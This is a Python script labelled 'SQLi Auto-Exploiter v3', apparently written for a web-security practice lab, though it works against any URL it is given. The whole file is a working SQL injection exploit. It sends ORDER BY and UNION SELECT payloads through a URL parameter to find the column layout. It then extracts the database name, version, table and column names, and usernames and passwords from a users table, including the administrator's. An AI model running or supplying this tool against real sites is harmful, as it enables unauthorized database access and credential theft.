#!/usr/bin/env python3
import requests
import sys
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

HEADERS = {'User-Agent': 'Mozilla/5.0 (Security-Scanner)'}

ERROR_SIGNS = [
    'Internal Server Error',
    'SQL syntax',
    'mysql_fetch',
    'ORA-',
    'PostgreSQL',
    'SQLite',
    'ODBC',
    'syntax error',
]

def build_url(url, param, value):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param] = [value]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))

def test_payload(url, param, payload, timeout=15):
    try:
        new_url = build_url(url, param, payload)
        r = requests.get(new_url, headers=HEADERS, timeout=timeout)
        return r
    except:
        return None

def has_error(r):
    if not r:
        return True
    text = r.text.lower()
    for sign in ERROR_SIGNS:
        if sign.lower() in text:
            return True
    return False

def find_columns(url, param):
    print(f"\n[*] Step 1: Finding number of columns...")
    time.sleep(0.5)
    
    for i in range(1, 11):
        payload = f"' ORDER BY {i}--"
        r = test_payload(url, param, payload)
        
        if has_error(r):
            print(f"  [+] Columns: {i-1}")
            return i - 1
        else:
            print(f"  [*] ORDER BY {i} OK")
        time.sleep(0.3)
    
    print(f"  [-] Could not determine columns")
    return None

def find_text_column(url, param, num_cols, test_string='test123'):
    print(f"\n[*] Step 2: Finding text column...")
    time.sleep(0.5)
    
    for i in range(num_cols):
        nulls = ['NULL'] * num_cols
        nulls[i] = f"'{test_string}'"
        payload = f"' UNION SELECT {','.join(nulls)}--"
        
        r = test_payload(url, param, payload)
        if r and test_string in r.text:
            print(f"  [+] Text column: {i + 1}")
            return i
        time.sleep(0.3)
    
    print(f"  [-] No text column found")
    return None

def extract_value(url, param, num_cols, text_col, query):
    try:
        nulls = ['NULL'] * num_cols
        nulls[text_col] = query
        payload = f"' UNION SELECT {','.join(nulls)}--"
        
        r = test_payload(url, param, payload)
        if not r:
            return None
        
        if has_error(r):
            return None
        
        matches = re.findall(r'<th>([^<]+)</th>|<td>([^<]+)</td>', r.text)
        results = []
        for m in matches:
            val = m[0] or m[1]
            if val and val != 'NULL' and not val.startswith('Corporate') and not val.startswith('Gifts'):
                results.append(val)
        return results
    except:
        return None

def auto_exploit(url):
    print(f"\n{'='*60}")
    print(f"  SQLi Auto-Exploiter v3")
    print(f"  Target: {url}")
    print(f"{'='*60}")
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        print("[-] No parameters found")
        return
    
    param = list(params.keys())[0]
    print(f"[*] Parameter: {param}")
    
    # Step 1: Columns
    num_cols = find_columns(url, param)
    if not num_cols:
        return
    
    # Step 2: Text column
    text_col = find_text_column(url, param, num_cols)
    if text_col is None:
        return
    
    print(f"\n{'='*60}")
    print(f"  EXTRACTION")
    print(f"{'='*60}")
    
    # Step 3: Try common queries
    queries = [
        ('Database', 'database()'),
        ('Version', 'version()'),
        ('Tables', "GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()"),
        ('Columns (users)', "GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'"),
        ('Credentials', "GROUP_CONCAT(username,':',password) FROM users"),
        ('Credentials (alt)', "username||'~'||password FROM users"),
        ('Admin Password', "password FROM users WHERE username='administrator'"),
        ('Admin User', "username FROM users"),
    ]
    
    for name, query in queries:
        print(f"\n[*] Trying: {name}")
        result = extract_value(url, param, num_cols, text_col, query)
        if result:
            for r in result[:5]:
                print(f"  [+] {r}")
        else:
            print(f"  [-] Failed or empty")
        time.sleep(0.3)
    
    print(f"\n{'='*60}")
    print(f"  DONE")
    print(f"{'='*60}\n")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 sqli_auto_v3.py <url>")
        sys.exit(1)
    
    auto_exploit(sys.argv[1])
